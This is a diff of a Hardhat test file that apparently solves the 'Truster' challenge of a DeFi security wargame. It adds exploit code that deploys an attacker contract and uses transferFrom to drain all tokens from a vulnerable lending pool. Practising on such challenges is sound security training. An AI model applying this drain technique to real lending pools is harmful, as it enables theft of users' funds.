@@ -1,46 +1,64 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { BigNumber } = require("@ethersproject/bignumber/lib/bignumber");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+describe("[Challenge] Truster", function () {
+  let deployer, attacker;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+  before(async function () {
+    this.timeout(20000);
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+    const DamnValuableToken = await ethers.getContractFactory(
+      "DamnValuableToken",
+      deployer
+    );
+    const TrusterLenderPool = await ethers.getContractFactory(
+      "TrusterLenderPool",
+      deployer
+    );
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+    this.token = await DamnValuableToken.deploy();
+    this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(
+      TOKENS_IN_POOL
+    );
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+  it("Exploit", async function () {
+    const AttackerContractFactory = await ethers.getContractFactory(
+      "TrusterAttacker",
+      deployer
+    );
+    const attackerContract = await AttackerContractFactory.deploy(
+      this.token.address,
+      this.pool.address
+    );
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+    await attackerContract
+      .connect(attacker)
+      .attack(TOKENS_IN_POOL, attacker.address);
+    await this.token
+      .connect(attacker)
+      .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Attacker has taken all tokens from the pool
+    expect(await this.token.balanceOf(attacker.address)).to.equal(
+      TOKENS_IN_POOL
+    );
+    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+  });
 });
-
